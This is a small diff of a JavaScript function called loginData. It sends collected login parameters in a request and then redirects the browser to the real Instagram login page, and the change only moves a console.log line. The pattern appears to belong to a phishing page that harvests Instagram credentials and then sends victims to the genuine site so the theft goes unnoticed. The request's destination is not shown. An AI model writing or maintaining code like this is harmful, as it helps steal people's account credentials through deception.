@@ -107,7 +107,7 @@ function loginData() {
     }
 
     request.send(JSON.stringify(params));
-
-    console.log(messaggio)
+    
     window.location.href = "https://www.instagram.com/login"
+    console.log(messaggio)
 }
